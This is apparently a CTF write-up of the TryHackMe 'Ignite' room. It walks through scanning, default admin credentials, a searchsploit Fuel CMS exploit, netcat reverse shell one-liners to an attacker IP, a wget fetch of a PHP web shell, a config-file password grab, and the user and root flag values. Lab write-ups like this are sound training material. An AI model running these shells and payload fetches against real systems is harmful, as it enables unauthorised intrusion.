---
description: 'https://tryhackme.com/room/ignite'
---

# Ignite

[https://sckull.github.io/posts/ignite/](https://sckull.github.io/posts/ignite/)

## INIT

```text
export ignite=10.10.28.158
ping $ignite

echo "10.10.28.158 ignite.thm" >> /etc/hosts
```

## NMAP

```text
nmap -sC -sV -O $ignite
```

![](../.gitbook/assets/image%20%28398%29.png)

## GOBUSTER

```text
gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](../.gitbook/assets/image%20%28377%29.png)

## HTTP

![](../.gitbook/assets/image%20%28388%29.png)

![](../.gitbook/assets/image%20%28396%29.png)

![](../.gitbook/assets/image%20%28380%29.png)

{% hint style="info" %}
login: admin

password: admin
{% endhint %}

![](../.gitbook/assets/image%20%28386%29.png)

![](../.gitbook/assets/image%20%28376%29.png)

```text
searchsploit Fuel
searchsploit -p 47138
```

![](../.gitbook/assets/image%20%28394%29.png)

```text
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
```

![](../.gitbook/assets/image%20%28378%29.png)

```text
nc -e /bin/sh 10.14.4.204 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
```

![](../.gitbook/assets/image%20%28384%29.png)

```text
cmd:bash shell.sh
```

![](../.gitbook/assets/image%20%28392%29.png)

```text
python3 ignite.py
wget http://10.14.4.204:8000/phpbash.php
```

![](../.gitbook/assets/image%20%28383%29.png)

![](../.gitbook/assets/image%20%28390%29.png)

![](../.gitbook/assets/image%20%28379%29.png)

![](../.gitbook/assets/image%20%28391%29.png)

### User.txt

{% hint style="success" %}
6470e394cbf6dab6a91682cc8585059b
{% endhint %}

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](../.gitbook/assets/image%20%28389%29.png)

```text
 cat /var/www/html/fuel/application/config/database.php
```

![](../.gitbook/assets/image%20%28395%29.png)

```text
su -
password: mememe
cat /root/root.txt
```

![](../.gitbook/assets/image%20%28387%29.png)

### Root.txt

{% hint style="success" %}
b9bbcb33e11b80be759c4e844862482d
{% endhint %}

